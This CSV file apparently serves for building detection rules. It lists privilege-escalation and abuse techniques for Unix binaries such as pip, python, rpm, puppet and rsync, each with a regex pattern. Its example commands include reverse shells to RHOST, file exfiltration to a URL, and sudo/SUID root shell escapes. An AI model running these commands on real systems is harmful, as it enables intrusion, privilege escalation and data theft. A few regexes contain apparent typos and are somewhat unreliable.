Name,Function,ExampleCode,KeywordsExtracted,RegexFuzzyV7,RegexFuzzyV7_KQL,Notes
php,file-write,"php -r 'file_put_contents(getenv(""LFILE""), ""DATA"");'",file_put_contents getenv,"(?i)\b(?:\S*/)?php.*file_put_contents\s*\(\s*[\'""""]\S+[\'""""]\s*\).*getenv\s*\(\s*[\'""""]\S+[\'""""]\s*\)","@""(?i)\b(?:\S*/)?php.*file_put_contents\s*\(\s*[\'""""""""]\S+[\'""""""""]\s*\).*getenv\s*\(\s*[\'""""""""]\S+[\'""""""""]\s*\)""",
pic,file-read,pic $LFILE,,(?i)\b(?:\S*/)?pic\b,"@""(?i)\b(?:\S*/)?pic\b""",
pic,shell,"pic -U
.PS
sh X sh X",sh,(?i)\b(?:\S*/)?pic.*sh,"@""(?i)\b(?:\S*/)?pic.*sh""",
pic,sudo,"sudo pic -U
.PS
sh X sh X",sudo sh,(?i)\b(?:\S*/)?pic.*sudo.*sh,"@""(?i)\b(?:\S*/)?pic.*sudo.*sh""",
pic,limited-suid,"./pic -U
.PS
sh X sh X",sh /pic,(?i)\b(?:\S*/)?pic.*sh.*/pic,"@""(?i)\b(?:\S*/)?pic.*sh.*/pic""",
pico,shell,"pico
^R^X
reset; sh 1>&0 2>&0",reset sh,(?i)\b(?:\S*/)?pico.*reset.*sh,"@""(?i)\b(?:\S*/)?pico.*reset.*sh""",
pico,shell,"pico -s /bin/sh
/bin/sh
^T",/bin/sh,(?i)\b(?:\S*/)?pico.*/bin/sh,"@""(?i)\b(?:\S*/)?pico.*/bin/sh""",
pico,file-write,"pico file_to_write
DATA
^O",,(?i)\b(?:\S*/)?pico\b,"@""(?i)\b(?:\S*/)?pico\b""",
pico,file-read,pico file_to_read,,(?i)\b(?:\S*/)?pico\b,"@""(?i)\b(?:\S*/)?pico\b""",
pico,limited-suid,"./pico -s /bin/sh
/bin/sh
^T",/bin/sh /pico,(?i)\b(?:\S*/)?pico.*/bin/sh.*/pico,"@""(?i)\b(?:\S*/)?pico.*/bin/sh.*/pico""",
pico,sudo,"sudo pico
^R^X
reset; sh 1>&0 2>&0",sudo reset sh,(?i)\b(?:\S*/)?pico.*sudo.*reset.*sh,"@""(?i)\b(?:\S*/)?pico.*sudo.*reset.*sh""",
pidstat,command,pidstat -e $COMMAND,,(?i)\b(?:\S*/)?pidstat\b,"@""(?i)\b(?:\S*/)?pidstat\b""",
pidstat,sudo,sudo pidstat -e $COMMAND,sudo,(?i)\b(?:\S*/)?pidstat.*sudo,"@""(?i)\b(?:\S*/)?pidstat.*sudo""",
pidstat,suid,./pidstat -e $COMMAND,/pidstat,(?i)\b(?:\S*/)?pidstat.*/pidstat,"@""(?i)\b(?:\S*/)?pidstat.*/pidstat""",
pip,shell,"echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py
pip install $TF",echo import os.execl /bin/sh sh tty TF/setup.py install /setup.py,(?i)\b(?:\S*/)?pip.*echo.*import.*os\.execl.*/bin/sh.*sh.*tty.*TF/setup\.py.*install,"@""(?i)\b(?:\S*/)?pip.*echo.*import.*os\.execl.*/bin/sh.*sh.*tty.*TF/setup\.py.*install""",
pip,reverse-shell,"echo 'import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")' > $TF/setup.py
pip install $TF",echo import sys pty s=socket.socket s.connect os.getenv int os.dup2 s.fileno for pty.spawn /bin/sh TF/setup.py install /setup.py,(?i)\b(?:\S*/)?pip.*echo.*import.*sys.*pty.*ssocket\.socket.*s\.connect.*os\.getenv.*int,"@""(?i)\b(?:\S*/)?pip.*echo.*import.*sys.*pty.*ssocket\.socket.*s\.connect.*os\.getenv.*int""",
pip,file-upload,"echo 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))' > $TF/setup.py
pip install $TF",echo import sys from environ sys.version_info.major urllib.request urllib.parse else urllib urllib2 r.urlopen bytes u.urlencode open .read .encode TF/setup.py install /setup.py,(?i)\b(?:\S*/)?pip.*echo.*import.*sys.*from.*environ.*sys\.version_info\.major.*urllib\.request.*urllib\.parse,"@""(?i)\b(?:\S*/)?pip.*echo.*import.*sys.*from.*environ.*sys\.version_info\.major.*urllib\.request.*urllib\.parse""",
pip,file-upload,"echo 'import sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py
pip install $TF",echo import sys from environ sys.version_info.major http.server socketserver else SimpleHTTPServer ss.TCPServer int s.SimpleHTTPRequestHandler .serve_forever TF/setup.py install /setup.py,(?i)\b(?:\S*/)?pip.*echo.*import.*sys.*from.*environ.*sys\.version_info\.major.*http\.server.*socketserver,"@""(?i)\b(?:\S*/)?pip.*echo.*import.*sys.*from.*environ.*sys\.version_info\.major.*http\.server.*socketserver""",
pip,file-download,"echo 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])' > $TF/setup.py
pip install $TF",echo import sys from environ sys.version_info.major urllib.request else urllib r.urlretrieve TF/setup.py install /setup.py,(?i)\b(?:\S*/)?pip.*echo.*import.*sys.*from.*environ.*sys\.version_info\.major.*urllib\.request.*else,"@""(?i)\b(?:\S*/)?pip.*echo.*import.*sys.*from.*environ.*sys\.version_info\.major.*urllib\.request.*else""",
pip,file-write,"echo ""open('$LFILE','w+').write('DATA')"" > $TF/setup.py
pip install $TF",echo open .write TF/setup.py install /setup.py,(?i)\b(?:\S*/)?pip.*echo.*open.*\.write.*TF/setup\.py.*install.*/setup\.py,"@""(?i)\b(?:\S*/)?pip.*echo.*open.*\.write.*TF/setup\.py.*install.*/setup\.py""",
pip,file-read,"echo 'raise Exception(open(""file_to_read"").read())' > $TF/setup.py
pip install $TF",echo raise Exception open .read TF/setup.py install /setup.py,(?i)\b(?:\S*/)?pip.*echo.*raise.*Exception.*open.*\.read.*TF/setup\.py.*install.*/setup\.py,"@""(?i)\b(?:\S*/)?pip.*echo.*raise.*Exception.*open.*\.read.*TF/setup\.py.*install.*/setup\.py""",
pip,library-load,"echo 'from ctypes import cdll; cdll.LoadLibrary(""lib.so"")' > $TF/setup.py
pip install $TF",echo from ctypes import cdll cdll.LoadLibrary lib.so TF/setup.py install /setup.py,(?i)\b(?:\S*/)?pip.*echo.*from.*ctypes.*import.*cdll.*cdll\.LoadLibrary.*lib\.so.*TF/setup\.py,"@""(?i)\b(?:\S*/)?pip.*echo.*from.*ctypes.*import.*cdll.*cdll\.LoadLibrary.*lib\.so.*TF/setup\.py""",
pip,sudo,"echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py
sudo pip install $TF",echo import os.execl /bin/sh sh tty TF/setup.py sudo install /setup.py,(?i)\b(?:\S*/)?pip.*echo.*import.*os\.execl.*/bin/sh.*sh.*tty.*TF/setup\.py.*sudo,"@""(?i)\b(?:\S*/)?pip.*echo.*import.*os\.execl.*/bin/sh.*sh.*tty.*TF/setup\.py.*sudo""",
pkexec,sudo,sudo pkexec /bin/sh,sudo /bin/sh,(?i)\b(?:\S*/)?pkexec.*sudo.*/bin/sh,"@""(?i)\b(?:\S*/)?pkexec.*sudo.*/bin/sh""",
pkg,sudo,sudo pkg install -y --no-repo-update ./x-1.0.txz,sudo install --no-repo-update ./x-1.0.txz /x-1.0.txz,(?i)\b(?:\S*/)?pkg.*sudo.*install.*\-\-no\-repo\-update.*\./x\-1\.0\.txz.*/x\-1\.0\.txz,"@""(?i)\b(?:\S*/)?pkg.*sudo.*install.*\-\-no\-repo\-update.*\./x\-1\.0\.txz.*/x\-1\.0\.txz""",
posh,shell,posh,,(?i)\b(?:\S*/)?posh\b,"@""(?i)\b(?:\S*/)?posh\b""",
posh,limited-suid,./posh,/posh,(?i)\b(?:\S*/)?posh.*/posh,"@""(?i)\b(?:\S*/)?posh.*/posh""",
posh,sudo,sudo posh,sudo,(?i)\b(?:\S*/)?posh.*sudo,"@""(?i)\b(?:\S*/)?posh.*sudo""",
pr,file-read,pr -T $LFILE,,(?i)\b(?:\S*/)?pr\b,"@""(?i)\b(?:\S*/)?pr\b""",
pr,suid,pr -T $LFILE,,(?i)\b(?:\S*/)?pr\b,"@""(?i)\b(?:\S*/)?pr\b""",
pr,sudo,pr -T $LFILE,,(?i)\b(?:\S*/)?pr\b,"@""(?i)\b(?:\S*/)?pr\b""",
pry,shell,"pry
system(""/bin/sh"")",system /bin/sh,(?i)\b(?:\S*/)?pry.*system.*/bin/sh,"@""(?i)\b(?:\S*/)?pry.*system.*/bin/sh""",
pry,sudo,"sudo pry
system(""/bin/sh"")",sudo system /bin/sh,(?i)\b(?:\S*/)?pry.*sudo.*system.*/bin/sh,"@""(?i)\b(?:\S*/)?pry.*sudo.*system.*/bin/sh""",
pry,limited-suid,"./pry
system(""/bin/sh"")",system /bin/sh /pry,(?i)\b(?:\S*/)?pry.*system.*/bin/sh.*/pry,"@""(?i)\b(?:\S*/)?pry.*system.*/bin/sh.*/pry""",
psftp,shell,"psftp
!/bin/sh",/bin/sh,(?i)\b(?:\S*/)?psftp.*/bin/sh,"@""(?i)\b(?:\S*/)?psftp.*/bin/sh""",
psftp,limited-suid,"sudo psftp
!/bin/sh",sudo /bin/sh,(?i)\b(?:\S*/)?psftp.*sudo.*/bin/sh,"@""(?i)\b(?:\S*/)?psftp.*sudo.*/bin/sh""",
psftp,sudo,"sudo psftp
!/bin/sh",sudo /bin/sh,(?i)\b(?:\S*/)?psftp.*sudo.*/bin/sh,"@""(?i)\b(?:\S*/)?psftp.*sudo.*/bin/sh""",
psql,shell,"psql
\?
!/bin/sh",/bin/sh,(?i)\b(?:\S*/)?psql.*/bin/sh,"@""(?i)\b(?:\S*/)?psql.*/bin/sh""",
psql,sudo,"psql
\?
!/bin/sh",/bin/sh,(?i)\b(?:\S*/)?psql.*/bin/sh,"@""(?i)\b(?:\S*/)?psql.*/bin/sh""",
ptx,file-read,"ptx -w 5000 ""$LFILE""",,(?i)\b(?:\S*/)?ptx\b,"@""(?i)\b(?:\S*/)?ptx\b""",
ptx,suid,"./ptx -w 5000 ""$LFILE""",/ptx,(?i)\b(?:\S*/)?ptx.*/ptx,"@""(?i)\b(?:\S*/)?ptx.*/ptx""",
ptx,sudo,"sudo ptx -w 5000 ""$LFILE""",sudo,(?i)\b(?:\S*/)?ptx.*sudo,"@""(?i)\b(?:\S*/)?ptx.*sudo""",
puppet,shell,"puppet apply -e ""exec { '/bin/sh -c \""exec sh -i <$(tty) >$(tty) 2>$(tty)\""': }""",apply exec /bin/sh sh tty,(?i)\b(?:\S*/)?puppet.*apply.*exec.*/bin/sh.*sh.*tty,"@""(?i)\b(?:\S*/)?puppet.*apply.*exec.*/bin/sh.*sh.*tty""",
puppet,file-write,"puppet apply -e ""file { '$LFILE': content => 'DATA' }""",apply content,(?i)\b(?:\S*/)?puppet.*apply.*content,"@""(?i)\b(?:\S*/)?puppet.*apply.*content""",
puppet,file-read,puppet filebucket -l diff /dev/null $LFILE,filebucket diff /dev/null,(?i)\b(?:\S*/)?puppet.*filebucket.*diff.*/dev/null,"@""(?i)\b(?:\S*/)?puppet.*filebucket.*diff.*/dev/null""",
puppet,sudo,"sudo puppet apply -e ""exec { '/bin/sh -c \""exec sh -i <$(tty) >$(tty) 2>$(tty)\""': }""",sudo apply exec /bin/sh sh tty,(?i)\b(?:\S*/)?puppet.*sudo.*apply.*exec.*/bin/sh.*sh.*tty,"@""(?i)\b(?:\S*/)?puppet.*sudo.*apply.*exec.*/bin/sh.*sh.*tty""",
pwsh,shell,pwsh,,(?i)\b(?:\S*/)?pwsh\b,"@""(?i)\b(?:\S*/)?pwsh\b""",
pwsh,file-write,"pwsh -c '""DATA"" | Out-File $env:LFILE'",Out-File env,(?i)\b(?:\S*/)?pwsh.*Out\-File.*env,"@""(?i)\b(?:\S*/)?pwsh.*Out\-File.*env""",
pwsh,sudo,sudo pwsh,sudo,(?i)\b(?:\S*/)?pwsh.*sudo,"@""(?i)\b(?:\S*/)?pwsh.*sudo""",
python,shell,"python -c 'import os; os.system(""/bin/sh"")'",import os.system /bin/sh,(?i)\b(?:\S*/)?python.*import.*os\.system.*/bin/sh,"@""(?i)\b(?:\S*/)?python.*import.*os\.system.*/bin/sh""",
python,reverse-shell,"python -c 'import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")'",import sys pty s=socket.socket s.connect os.getenv int os.dup2 s.fileno for pty.spawn /bin/sh,(?i)\b(?:\S*/)?python.*import.*sys.*pty.*ssocket\.socket.*s\.connect.*os\.getenv.*int.*os\.dup2,"@""(?i)\b(?:\S*/)?python.*import.*sys.*pty.*ssocket\.socket.*s\.connect.*os\.getenv.*int.*os\.dup2""",
python,file-upload,"python -c 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))'",import sys from environ sys.version_info.major urllib.request urllib.parse else urllib urllib2 r.urlopen bytes u.urlencode open .read .encode,(?i)\b(?:\S*/)?python.*import.*sys.*from.*environ.*sys\.version_info\.major.*urllib\.request.*urllib\.parse.*else,"@""(?i)\b(?:\S*/)?python.*import.*sys.*from.*environ.*sys\.version_info\.major.*urllib\.request.*urllib\.parse.*else""",
python,file-upload,"python -c 'import sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()'",import sys from environ sys.version_info.major http.server socketserver else SimpleHTTPServer ss.TCPServer int s.SimpleHTTPRequestHandler .serve_forever,(?i)\b(?:\S*/)?python.*import.*sys.*from.*environ.*sys\.version_info\.major.*http\.server.*socketserver.*else,"@""(?i)\b(?:\S*/)?python.*import.*sys.*from.*environ.*sys\.version_info\.major.*http\.server.*socketserver.*else""",
python,file-download,"python -c 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])'",import sys from environ sys.version_info.major urllib.request else urllib r.urlretrieve,(?i)\b(?:\S*/)?python.*import.*sys.*from.*environ.*sys\.version_info\.major.*urllib\.request.*else.*urllib,"@""(?i)\b(?:\S*/)?python.*import.*sys.*from.*environ.*sys\.version_info\.major.*urllib\.request.*else.*urllib""",
python,file-write,"python -c 'open(""file_to_write"",""w+"").write(""DATA"")'",open .write,(?i)\b(?:\S*/)?python.*open.*\.write,"@""(?i)\b(?:\S*/)?python.*open.*\.write""",
python,file-read,"python -c 'print(open(""file_to_read"").read())'",print open .read,(?i)\b(?:\S*/)?python.*print.*open.*\.read,"@""(?i)\b(?:\S*/)?python.*print.*open.*\.read""",
python,library-load,"python -c 'from ctypes import cdll; cdll.LoadLibrary(""lib.so"")'",from ctypes import cdll cdll.LoadLibrary lib.so,(?i)\b(?:\S*/)?python.*from.*ctypes.*import.*cdll.*cdll\.LoadLibrary.*lib\.so,"@""(?i)\b(?:\S*/)?python.*from.*ctypes.*import.*cdll.*cdll\.LoadLibrary.*lib\.so""",
python,suid,"./python -c 'import os; os.execl(""/bin/sh"", ""sh"", ""-p"")'",import os.execl /bin/sh sh /python,(?i)\b(?:\S*/)?python.*import.*os\.execl.*/bin/sh.*sh.*/python,"@""(?i)\b(?:\S*/)?python.*import.*os\.execl.*/bin/sh.*sh.*/python""",
python,sudo,"sudo python -c 'import os; os.system(""/bin/sh"")'",sudo import os.system /bin/sh,(?i)\b(?:\S*/)?python.*sudo.*import.*os\.system.*/bin/sh,"@""(?i)\b(?:\S*/)?python.*sudo.*import.*os\.system.*/bin/sh""",
python,capabilities,"./python -c 'import os; os.setuid(0); os.system(""/bin/sh"")'",import os.setuid os.system /bin/sh /python,(?i)\b(?:\S*/)?python.*import.*os\.setuid.*os\.system.*/bin/sh.*/python,"@""(?i)\b(?:\S*/)?python.*import.*os\.setuid.*os\.system.*/bin/sh.*/python""",
rake,file-read,rake -f $LFILE,,(?i)\b(?:\S*/)?rake\b,"@""(?i)\b(?:\S*/)?rake\b""",
rake,shell,rake -p '`/bin/sh 1>&0`',/bin/sh,(?i)\b(?:\S*/)?rake.*/bin/sh,"@""(?i)\b(?:\S*/)?rake.*/bin/sh""",
rake,sudo,sudo rake -p '`/bin/sh 1>&0`',sudo /bin/sh,(?i)\b(?:\S*/)?rake.*sudo.*/bin/sh,"@""(?i)\b(?:\S*/)?rake.*sudo.*/bin/sh""",
rake,limited-suid,./rake -p '`/bin/sh 1>&0`',/bin/sh /rake,(?i)\b(?:\S*/)?rake.*/bin/sh.*/rake,"@""(?i)\b(?:\S*/)?rake.*/bin/sh.*/rake""",
rc,shell,rc -c '/bin/sh',/bin/sh,(?i)\b(?:\S*/)?rc.*/bin/sh,"@""(?i)\b(?:\S*/)?rc.*/bin/sh""",
rc,suid,./rc -c '/bin/sh -p',/bin/sh,(?i)\b(?:\S*/)?rc.*/bin/sh,"@""(?i)\b(?:\S*/)?rc.*/bin/sh""",
rc,sudo,sudo rc -c '/bin/sh',sudo /bin/sh,(?i)\b(?:\S*/)?rc.*sudo.*/bin/sh,"@""(?i)\b(?:\S*/)?rc.*sudo.*/bin/sh""",
readelf,file-read,readelf -a @$LFILE,,(?i)\b(?:\S*/)?readelf\b,"@""(?i)\b(?:\S*/)?readelf\b""",
readelf,suid,./readelf -a @$LFILE,/readelf,(?i)\b(?:\S*/)?readelf.*/readelf,"@""(?i)\b(?:\S*/)?readelf.*/readelf""",
readelf,sudo,sudo readelf -a @$LFILE,sudo,(?i)\b(?:\S*/)?readelf.*sudo,"@""(?i)\b(?:\S*/)?readelf.*sudo""",
red,file-write,"red file_to_write
a
DATA
.
w
q",,(?i)\b(?:\S*/)?red\b,"@""(?i)\b(?:\S*/)?red\b""",
red,file-read,"red file_to_read
,p
q",,(?i)\b(?:\S*/)?red\b,"@""(?i)\b(?:\S*/)?red\b""",
red,sudo,"sudo red file_to_write
a
DATA
.
w
q",sudo,(?i)\b(?:\S*/)?red.*sudo,"@""(?i)\b(?:\S*/)?red.*sudo""",
redcarpet,file-read,"redcarpet ""$LFILE""",,(?i)\b(?:\S*/)?redcarpet\b,"@""(?i)\b(?:\S*/)?redcarpet\b""",
redcarpet,sudo,"sudo redcarpet ""$LFILE""",sudo,(?i)\b(?:\S*/)?redcarpet.*sudo,"@""(?i)\b(?:\S*/)?redcarpet.*sudo""",
redis,file-write,"redis-cli -h $IP
config set dir dir_to_write_to
config set dbfilename file_to_write
set x ""DATA""
save",redis-cli config set dir_to_write_to dbfilename save,(?i)\b(?:\S*/)?redis.*redis\-cli.*config.*set.*dir_to_write_to.*dbfilename.*save,"@""(?i)\b(?:\S*/)?redis.*redis\-cli.*config.*set.*dir_to_write_to.*dbfilename.*save""",
restic,file-upload,"restic backup -r ""rest:http://$RHOST:$RPORT/$NAME"" ""$LFILE""",backup rest http RPORT/ NAME,(?i)\b(?:\S*/)?restic.*backup.*rest.*http.*RPORT/.*NAME,"@""(?i)\b(?:\S*/)?restic.*backup.*rest.*http.*RPORT/.*NAME""",
restic,sudo,"sudo restic backup -r ""rest:http://$RHOST:$RPORT/$NAME"" ""$LFILE""",sudo backup rest http RPORT/ NAME,(?i)\b(?:\S*/)?restic.*sudo.*backup.*rest.*http.*RPORT/.*NAME,"@""(?i)\b(?:\S*/)?restic.*sudo.*backup.*rest.*http.*RPORT/.*NAME""",
restic,suid,"./restic backup -r ""rest:http://$RHOST:$RPORT/$NAME"" ""$LFILE""",backup rest http RPORT/ NAME /restic,(?i)\b(?:\S*/)?restic.*backup.*rest.*http.*RPORT/.*NAME.*/restic,"@""(?i)\b(?:\S*/)?restic.*backup.*rest.*http.*RPORT/.*NAME.*/restic""",
rev,file-read,rev $LFILE | rev,,(?i)\b(?:\S*/)?rev\b,"@""(?i)\b(?:\S*/)?rev\b""",
rev,suid,./rev $LFILE | rev,/rev,(?i)\b(?:\S*/)?rev.*/rev,"@""(?i)\b(?:\S*/)?rev.*/rev""",
rev,sudo,sudo rev $LFILE | rev,sudo,(?i)\b(?:\S*/)?rev.*sudo,"@""(?i)\b(?:\S*/)?rev.*sudo""",
rlogin,file-upload,"rlogin -l ""$(cat $LFILE)"" -p $RPORT $RHOST",cat,(?i)\b(?:\S*/)?rlogin.*cat,"@""(?i)\b(?:\S*/)?rlogin.*cat""",
rlwrap,shell,rlwrap /bin/sh,/bin/sh,(?i)\b(?:\S*/)?rlwrap.*/bin/sh,"@""(?i)\b(?:\S*/)?rlwrap.*/bin/sh""",
rlwrap,file-write,"rlwrap -l ""$LFILE"" echo DATA",echo,(?i)\b(?:\S*/)?rlwrap.*echo,"@""(?i)\b(?:\S*/)?rlwrap.*echo""",
rlwrap,suid,./rlwrap -H /dev/null /bin/sh -p,/dev/null /bin/sh /rlwrap,(?i)\b(?:\S*/)?rlwrap.*/dev/null.*/bin/sh.*/rlwrap,"@""(?i)\b(?:\S*/)?rlwrap.*/dev/null.*/bin/sh.*/rlwrap""",
rlwrap,sudo,sudo rlwrap /bin/sh,sudo /bin/sh,(?i)\b(?:\S*/)?rlwrap.*sudo.*/bin/sh,"@""(?i)\b(?:\S*/)?rlwrap.*sudo.*/bin/sh""",
rpm,shell,"rpm --eval '%{lua:os.execute(""/bin/sh"")}'","""--eval lua os.execute /bin/sh",(?i)\b(?:\S*/)?rpm.*\-\-eval.*lua.*os\.execute.*/bin/sh,"@""(?i)\b(?:\S*/)?rpm.*\-\-eval.*lua.*os\.execute.*/bin/sh""",
rpm,shell,rpm --pipe '/bin/sh 0<&1',"""--pipe /bin/sh",(?i)\b(?:\S*/)?rpm.*\-\-pipe.*/bin/sh,"@""(?i)\b(?:\S*/)?rpm.*\-\-pipe.*/bin/sh""",
rpm,limited-suid,"./rpm --eval '%{lua:os.execute(""/bin/sh"")}'","""--eval lua os.execute /bin/sh /rpm",(?i)\b(?:\S*/)?rpm.*\-\-eval.*lua.*os\.execute.*/bin/sh.*/rpm,"@""(?i)\b(?:\S*/)?rpm.*\-\-eval.*lua.*os\.execute.*/bin/sh.*/rpm""",
rpm,sudo,"sudo rpm --eval '%{lua:os.execute(""/bin/sh"")}'",sudo --eval lua os.execute /bin/sh,(?i)\b(?:\S*/)?rpm.*sudo.*\-\-eval.*lua.*os\.execute.*/bin/sh,"@""(?i)\b(?:\S*/)?rpm.*sudo.*\-\-eval.*lua.*os\.execute.*/bin/sh""",
rpm,sudo,sudo rpm -ivh x-1.0-1.noarch.rpm,sudo -ivh x-1.0-1.noarch.rpm,(?i)\b(?:\S*/)?rpm.*sudo.*\-ivh.*x\-1\.0\-1\.noarch\.rpm,"@""(?i)\b(?:\S*/)?rpm.*sudo.*\-ivh.*x\-1\.0\-1\.noarch\.rpm""",
rpmdb,shell,rpmdb --eval '%(/bin/sh 1>&2)',"""--eval /bin/sh",(?i)\b(?:\S*/)?rpmdb.*\-\-eval.*/bin/sh,"@""(?i)\b(?:\S*/)?rpmdb.*\-\-eval.*/bin/sh""",
rpmdb,limited-suid,./rpmdb --eval '%(/bin/sh 1>&2)',"""--eval /bin/sh /rpmdb",(?i)\b(?:\S*/)?rpmdb.*\-\-eval.*/bin/sh.*/rpmdb,"@""(?i)\b(?:\S*/)?rpmdb.*\-\-eval.*/bin/sh.*/rpmdb""",
rpmdb,sudo,sudo rpmdb --eval '%(/bin/sh 1>&2)',sudo --eval /bin/sh,(?i)\b(?:\S*/)?rpmdb.*sudo.*\-\-eval.*/bin/sh,"@""(?i)\b(?:\S*/)?rpmdb.*sudo.*\-\-eval.*/bin/sh""",
rpmquery,shell,"rpmquery --eval '%{lua:posix.exec(""/bin/sh"")}'","""--eval lua posix.exec /bin/sh",(?i)\b(?:\S*/)?rpmquery.*\-\-eval.*lua.*posix\.exec.*/bin/sh,"@""(?i)\b(?:\S*/)?rpmquery.*\-\-eval.*lua.*posix\.exec.*/bin/sh""",
rpmquery,limited-suid,"./rpmquery --eval '%{lua:os.execute(""/bin/sh"")}'","""--eval lua os.execute /bin/sh /rpmquery",(?i)\b(?:\S*/)?rpmquery.*\-\-eval.*lua.*os\.execute.*/bin/sh.*/rpmquery,"@""(?i)\b(?:\S*/)?rpmquery.*\-\-eval.*lua.*os\.execute.*/bin/sh.*/rpmquery""",
rpmquery,sudo,"sudo rpmquery --eval '%{lua:posix.exec(""/bin/sh"")}'",sudo --eval lua posix.exec /bin/sh,(?i)\b(?:\S*/)?rpmquery.*sudo.*\-\-eval.*lua.*posix\.exec.*/bin/sh,"@""(?i)\b(?:\S*/)?rpmquery.*sudo.*\-\-eval.*lua.*posix\.exec.*/bin/sh""",
rpmverify,shell,rpmverify --eval '%(/bin/sh 1>&2)',"""--eval /bin/sh",(?i)\b(?:\S*/)?rpmverify.*\-\-eval.*/bin/sh,"@""(?i)\b(?:\S*/)?rpmverify.*\-\-eval.*/bin/sh""",
rpmverify,limited-suid,./rpmverify --eval '%(/bin/sh 1>&2)',"""--eval /bin/sh /rpmverify",(?i)\b(?:\S*/)?rpmverify.*\-\-eval.*/bin/sh.*/rpmverify,"@""(?i)\b(?:\S*/)?rpmverify.*\-\-eval.*/bin/sh.*/rpmverify""",
rpmverify,sudo,sudo rpmverify --eval '%(/bin/sh 1>&2)',sudo --eval /bin/sh,(?i)\b(?:\S*/)?rpmverify.*sudo.*\-\-eval.*/bin/sh,"@""(?i)\b(?:\S*/)?rpmverify.*sudo.*\-\-eval.*/bin/sh""",
rsync,shell,"rsync -e 'sh -c ""sh 0<&2 1>&2""' 127.0.0.1:/dev/null",sh /dev/null,(?i)\b(?:\S*/)?rsync.*sh.*/dev/null,"@""(?i)\b(?:\S*/)?rsync.*sh.*/dev/null""",
rsync,sudo,"sudo rsync -e 'sh -c ""sh 0<&2 1>&2""' 127.0.0.1:/dev/null",sudo sh /dev/null,(?i)\b(?:\S*/)?rsync.*sudo.*sh.*/dev/null,"@""(?i)\b(?:\S*/)?rsync.*sudo.*sh.*/dev/null""",
rsync,suid,"./rsync -e 'sh -p -c ""sh 0<&2 1>&2""' 127.0.0.1:/dev/null",sh /dev/null /rsync,(?i)\b(?:\S*/)?rsync.*sh.*/dev/null.*/rsync,"@""(?i)\b(?:\S*/)?rsync.*sh.*/dev/null.*/rsync""",
rtorrent,shell,"echo ""execute = /bin/sh,-c,\""/bin/sh <$(tty) >$(tty) 2>$(tty)\"""" >~/.rtorrent.rc
rtorrent",echo execute /bin/sh tty /.rtorrent.rc,(?i)\b(?:\S*/)?rtorrent.*echo.*execute.*/bin/sh.*tty.*/\.rtorrent\.rc,"@""(?i)\b(?:\S*/)?rtorrent.*echo.*execute.*/bin/sh.*tty.*/\.rtorrent\.rc""",
